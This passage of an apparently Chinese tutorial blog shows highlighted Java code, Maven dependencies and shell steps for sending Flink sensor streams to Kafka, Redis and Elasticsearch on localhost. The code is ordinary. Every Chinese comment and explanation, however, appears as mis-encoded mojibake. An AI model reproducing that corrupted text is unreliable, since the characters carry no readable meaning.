class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-kafka_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> ç¼–å†™javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.sink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.serialization.SimpleStringSchema;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.kafka.FlinkKafkaConsumer;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.kafka.FlinkKafkaProducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 1:11 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SinkTest1_Kafka</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¹¶è¡Œåº¦è®¾ç½®ä¸º1</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">        properties.setProperty(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;group.id&quot;</span>, <span class="string">&quot;consumer-group&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;key.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;value.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;auto.offset.reset&quot;</span>, <span class="string">&quot;latest&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»Kafkaä¸­è¯»å–æ•°æ®</span></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.addSource( <span class="keyword">new</span> FlinkKafkaConsumer&lt;String&gt;(<span class="string">&quot;sensor&quot;</span>, <span class="keyword">new</span> SimpleStringSchema(), properties));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–ä»Kafkaä¸­è¯»å–çš„æ•°æ®</span></span><br><span class="line">        DataStream&lt;String&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>])).toString();</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†æ•°æ®å†™å…¥Kafka</span></span><br><span class="line">        dataStream.addSink( <span class="keyword">new</span> FlinkKafkaProducer&lt;String&gt;(<span class="string">&quot;localhost:9092&quot;</span>, <span class="string">&quot;sinktest&quot;</span>, <span class="keyword">new</span> SimpleStringSchema()));</span><br><span class="line">        </span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨zookeeper  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/zookeeper-server-start.sh config/zookeeper.properties</span></span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨kafkaæœåŠ¡  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-server-start.sh config/server.properties</span></span><br></pre></td></tr></table></figure></li><li><p> æ–°å»ºkafkaç”Ÿäº§è€…console  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-producer.sh --broker-list localhost:9092  --topic sensor</span></span><br></pre></td></tr></table></figure></li><li><p> æ–°å»ºkafkaæ¶ˆè´¹è€…console  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic sinktest</span></span><br></pre></td></tr></table></figure></li><li><p> è¿è¡ŒFlinkç¨‹åºï¼Œåœ¨kafkaç”Ÿäº§è€…consoleè¾“å…¥æ•°æ®ï¼ŒæŸ¥çœ‹kafkaæ¶ˆè´¹è€…consoleçš„è¾“å‡ºç»“æœ<br>è¾“å…¥(kafkaç”Ÿäº§è€…console)<br>è¾“å‡º(kafkaæ¶ˆè´¹è€…console)  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_1,1547718199,35.8</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_6,1547718201,15.4</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718199, temperature=35.8&#125;</span><br><span class="line">SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, temperature=15.4&#125;</span><br></pre></td></tr></table></figure></li></ol><p>è¿™é‡ŒFlinkçš„ä½œç”¨ç›¸å½“äºpipelineäº†ã€‚</p><h5 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h5><blockquote><p><a href="https://mvnrepository.com/search?q=flink-connector-redis">flink-connector-redis</a></p><p>æŸ¥è¯¢Flinkè¿æ¥å™¨ï¼Œæœ€ç®€å•çš„å°±æ˜¯æŸ¥è¯¢å…³é”®å­—<code>flink-connector-</code></p></blockquote><p>è¿™é‡Œå°†Rediså½“ä½œsinkçš„è¾“å‡ºå¯¹è±¡ã€‚</p><ol><li><p> pomä¾èµ–<br>è¿™ä¸ªå¯è°“ç›¸å½“è€çš„ä¾èµ–äº†ï¼Œ2017å¹´çš„ã€‚  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.bahir/flink-connector-redis --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.bahir<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-redis_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> ç¼–å†™javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.sink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.redis.RedisSink;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.redis.common.config.FlinkJedisPoolConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.redis.common.mapper.RedisCommand;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.redis.common.mapper.RedisCommandDescription;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.redis.common.mapper.RedisMapper;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 1:47 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SinkTest2_Redis</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶è¯»å–æ•°æ®</span></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®šä¹‰jedisè¿æ¥é…ç½®(æˆ‘è¿™é‡Œè¿æ¥çš„æ˜¯dockerçš„redis)</span></span><br><span class="line">        FlinkJedisPoolConfig config = <span class="keyword">new</span> FlinkJedisPoolConfig.Builder()</span><br><span class="line">                .setHost(<span class="string">&quot;localhost&quot;</span>)</span><br><span class="line">                .setPort(<span class="number">6379</span>)</span><br><span class="line">                .setPassword(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">                .setDatabase(<span class="number">0</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        dataStream.addSink(<span class="keyword">new</span> RedisSink&lt;&gt;(config, <span class="keyword">new</span> MyRedisMapper()));</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è‡ªå®šä¹‰RedisMapper</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyRedisMapper</span> <span class="keyword">implements</span> <span class="title">RedisMapper</span>&lt;<span class="title">SensorReading</span>&gt; </span>&#123;</span><br><span class="line">        <span class="comment">// å®šä¹‰ä¿å­˜æ•°æ®åˆ°redisçš„å‘½ä»¤ï¼Œå­˜æˆHashè¡¨ï¼Œhset sensor_temp id temperature</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> RedisCommandDescription <span class="title">getCommandDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> RedisCommandDescription(RedisCommand.HSET, <span class="string">&quot;sensor_temp&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getKeyFromData</span><span class="params">(SensorReading data)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> data.getId();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getValueFromData</span><span class="params">(SensorReading data)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> data.getTemperature().toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨redisæœåŠ¡ï¼ˆæˆ‘è¿™é‡Œæ˜¯dockeré‡Œçš„ï¼‰ </p></li><li><p> å¯åŠ¨Flinkç¨‹åº </p></li><li><p> æŸ¥çœ‹Redisé‡Œçš„æ•°æ®<br><em>å› ä¸ºæœ€æ–°æ•°æ®è¦†ç›–å‰é¢çš„ï¼Œæ‰€ä»¥æœ€åredisé‡Œå‘ˆç°çš„æ˜¯æœ€æ–°çš„æ•°æ®ã€‚</em>  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">localhost:0&gt;hgetall sensor_temp</span><br><span class="line">1) &quot;sensor_1&quot;</span><br><span class="line">2) &quot;37.1&quot;</span><br><span class="line">3) &quot;sensor_6&quot;</span><br><span class="line">4) &quot;15.4&quot;</span><br><span class="line">5) &quot;sensor_7&quot;</span><br><span class="line">6) &quot;6.7&quot;</span><br><span class="line">7) &quot;sensor_10&quot;</span><br><span class="line">8) &quot;38.1&quot;</span><br></pre></td></tr></table></figure></li></ol><h5 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h5><blockquote><p><a href="https://blog.csdn.net/weixin_42066446/article/details/113243977">Flink 1.12.1 ElasticSearchè¿æ¥ Sink</a></p></blockquote><ol><li><p> pomä¾èµ–  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ElasticSearch7 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-elasticsearch7_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> ç¼–å†™javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.sink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.RuntimeContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.elasticsearch.ElasticsearchSinkFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.elasticsearch.RequestIndexer;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.elasticsearch7.ElasticsearchSink;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.HttpHost;</span><br><span class="line"><span class="keyword">import</span> org.elasticsearch.action.index.IndexRequest;</span><br><span class="line"><span class="keyword">import</span> org.elasticsearch.client.Requests;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 2:13 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SinkTest3_Es</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶è¯»å–æ•°æ®</span></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®šä¹‰esçš„è¿æ¥é…ç½®</span></span><br><span class="line">        List&lt;HttpHost&gt; httpHosts = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        httpHosts.add(<span class="keyword">new</span> HttpHost(<span class="string">&quot;localhost&quot;</span>, <span class="number">9200</span>));</span><br><span class="line"></span><br><span class="line">        dataStream.addSink( <span class="keyword">new</span> ElasticsearchSink.Builder&lt;SensorReading&gt;(httpHosts, <span class="keyword">new</span> MyEsSinkFunction()).build());</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®ç°è‡ªå®šä¹‰çš„ESå†™å…¥æ“ä½œ</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyEsSinkFunction</span> <span class="keyword">implements</span> <span class="title">ElasticsearchSinkFunction</span>&lt;<span class="title">SensorReading</span>&gt; </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(SensorReading element, RuntimeContext ctx, RequestIndexer indexer)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// å®šä¹‰å†™å…¥çš„æ•°æ®source</span></span><br><span class="line">            HashMap&lt;String, String&gt; dataSource = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            dataSource.put(<span class="string">&quot;id&quot;</span>, element.getId());</span><br><span class="line">            dataSource.put(<span class="string">&quot;temp&quot;</span>, element.getTemperature().toString());</span><br><span class="line">            dataSource.put(<span class="string">&quot;ts&quot;</span>, element.getTimestamp().toString());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åˆ›å»ºè¯·æ±‚ï¼Œä½œä¸ºå‘eså‘èµ·çš„å†™å…¥å‘½ä»¤(ES7ç»Ÿä¸€typeå°±æ˜¯_docï¼Œä¸å†å…è®¸æŒ‡å®štype)</span></span><br><span class="line">            IndexRequest indexRequest = Requests.indexRequest()</span><br><span class="line">                    .index(<span class="string">&quot;sensor&quot;</span>)</span><br><span class="line">                    .source(dataSource);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ç”¨indexå‘é€è¯·æ±‚</span></span><br><span class="line">            indexer.add(indexRequest);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨ElasticSearchï¼ˆæˆ‘è¿™é‡Œæ˜¯dockerå¯åŠ¨çš„ </p></li><li><p> è¿è¡ŒFlinkç¨‹åºï¼ŒæŸ¥çœ‹ElasticSearchæ˜¯å¦æ–°å¢æ•°æ®  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl <span class="string">&quot;localhost:9200/sensor/_search?pretty&quot;</span></span></span><br><span class="line">&#123;</span><br><span class="line">  &quot;took&quot; : 1,</span><br><span class="line">  &quot;timed_out&quot; : false,</span><br><span class="line">  &quot;_shards&quot; : &#123;</span><br><span class="line">    &quot;total&quot; : 1,</span><br><span class="line">    &quot;successful&quot; : 1,</span><br><span class="line">    &quot;skipped&quot; : 0,</span><br><span class="line">    &quot;failed&quot; : 0</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;hits&quot; : &#123;</span><br><span class="line">    &quot;total&quot; : &#123;</span><br><span class="line">      &quot;value&quot; : 7,</span><br><span class="line">      &quot;relation&quot; : &quot;eq&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;max_score&quot; : 1.0,</span><br><span class="line">    &quot;hits&quot; : [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">        &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;jciyWXcBiXrGJa12kSQt&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;35.8&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_1&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718199&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">      